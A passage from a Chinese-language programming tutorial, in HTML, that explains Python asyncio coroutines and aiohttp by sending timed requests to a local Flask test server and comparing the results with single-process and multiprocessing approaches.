<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">coroutline  = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutline)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'Task Result:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="多任务协程（通过task列表来实现，调用asncio-wait-方法执行）"><a href="#多任务协程（通过task列表来实现，调用asncio-wait-方法执行）" class="headerlink" title="多任务协程（通过task列表来实现，调用asncio.wait()方法执行）"></a>多任务协程（通过task列表来实现，调用asncio.wait()方法执行）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]  <span class="comment">#利用for循环创建5个task</span></span><br><span class="line">print(<span class="string">'Tasks:'</span>,tasks)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))   <span class="comment">#asyncio.wait(tasks)将task列表注入到loop循环事件中</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">    print(<span class="string">'Task Request:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Tasks: [&lt;Task pending coro=&lt;Request() running at D:/python/实战项目/Coroutine6.py:<span class="number">4</span>&gt;&gt;, &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<h4 id="协程实现"><a href="#协程实现" class="headerlink" title="协程实现"></a>协程实现</h4><blockquote>
<p>以上是对协程基本的定义使用，并没有进行异步处理的操作，这里用flask模拟网络请求有延迟的情况，然后进行挂起，异步的操作。</p>
</blockquote>
<ol>
<li><p>利用flask编写模拟有网络延迟的服务器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)      <span class="comment">#表示请求这个接口要延时3秒显示结果，模拟延迟的网络</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello!'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(threaded = <span class="keyword">True</span>)  <span class="comment">#threaded = True表示在服务器开启了多线程模式，如果不开启，服务端是单线程模式，如果还是异步I/O请求的方式，依旧要排队等待依次执行。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1541731526.07.png" alt></p>
</li>
<li><p>通过协程的方式来请求生成的模拟服务端页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.040287971496582</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过协程的方式请求页面发现还是在依次执行，时间为15s，效率并没有提高，原因是：协程提高效率的最大 特点是异步协程，重点是要能够异步请求，就需要程序可以将阻塞的协程挂起，让出控制权，执行其他协程。在python3.5及以后通过await实现挂起的操作，当loop循环事件遇到await是就执行协程挂起。</p>
</li>
<li><p>根据第三点的提出的特点，我们要实现挂起的是请求页面的操作，所以这里将请求页面的方法做一个修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Cost time: <span class="number">15.033875942230225</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"D:/python/实战项目/Coroutine8.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> Request</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">TypeError: object Response can<span class="string">'t be used in '</span><span class="keyword">await</span><span class="string">' expression</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，不能这样修改，Waiting for http这里确实是挂起了，但是await后面的对象不对，因为await后面必须跟一个原生 coroutine 对象或者一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象，而requests.get的生成的对象是：<class 'requests.models.response'>，所以不符合</class></p>
</li>
<li><p>所以考虑将请求页面的方法单独封装，实现生成coroutine 对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.035670042037964</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，将I/O操作的代码封装到 async 修饰的方法里面是不可行，无法实现异步请求，所以必须使用支持异步请求的方法来实现，这里使用<strong>aiohttp</strong>(时间缩短为原来的1/5，效率大大提高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不要为每次的连接都创建一次session,一般情况下只需要创建一个session，然后使用这个session执行所有的请求。</span></span><br><span class="line"><span class="comment">#每个session对象，内部包含了一个连接池，并且将会保持连接和连接复用（默认开启）可以加快整体的性能。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">       session = aiohttp.ClientSession()</span><br><span class="line">       response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">       result = <span class="keyword">await</span> response.text()</span><br><span class="line">       <span class="keyword">await</span> session.close()           </span><br><span class="line">       <span class="comment">#这里的await是必须的，因为session的请求会话出现了可挂起的选项，如果close不可以挂起，会出现阻塞的状态导致报错</span></span><br><span class="line">       <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">   <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = <span class="keyword">await</span> get(url)</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line">   tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">   end = time.time()</span><br><span class="line">   print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.0310966968536377</span></span><br><span class="line"><span class="comment"># 修改await session.close()为session.close()的报错执行结果</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.012549638748169</span></span><br><span class="line">   D:/python/Conoutine10.py:<span class="number">12</span>: RuntimeWarning: coroutine <span class="string">'ClientSession.close'</span> was never        session.close()</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9D68</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9EF0</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F28</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F98</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F60</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过几次代码的修改，我们成功的实现了真正的异步协程。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！这里对应这我们模拟服务端设置的延时3秒。</p>
</li>
<li><p>根据上面显示的结果来看，5个task在3s之内都是挂起的等待的，同理，在3s之内CPU处理的task数量肯定会比5个（取决于CPU，我这里改成1000就会报错）；所以就意味着在CPU允许的范围之内处理多少task的时间都是3s（前提是服务段抗压性好，能正确对每次请求做出正确的返回）。将5改为300来测试：task数量提高了60倍，处理时间还是3s，可以看到协程的优点；多出来的部分时间是IO 传输时延</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    <span class="keyword">await</span>  session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="与单进程、多进程、多线程的对比"><a href="#与单进程、多进程、多线程的对比" class="headerlink" title="与单进程、多进程、多线程的对比"></a>与单进程、多进程、多线程的对比</h3><ol>
<li><p>单进程，单线程：(以10次请求为例)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">	url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    Request()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.057233095169067</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多进程(以10次请求为例)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> time</span><br><span class="line">   <span class="keyword">import</span> multiprocessing</span><br><span class="line"> </span><br><span class="line">   start = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">(_)</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = requests.get(url).text</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       cpu_count = multiprocessing.cpu_count()    <span class="comment">#cpu数目</span></span><br><span class="line">       print(<span class="string">'Cpu count:'</span>,cpu_count)</span><br><span class="line">       pool = multiprocessing.Pool(cpu_count)</span><br><span class="line">       pool.map(Request,range(<span class="number">10</span>))</span><br><span class="line">       end = time.time()</span><br><span class="line">       print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#运行结果：</span></span><br><span class="line">   Cpu count: <span class="number">4</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span 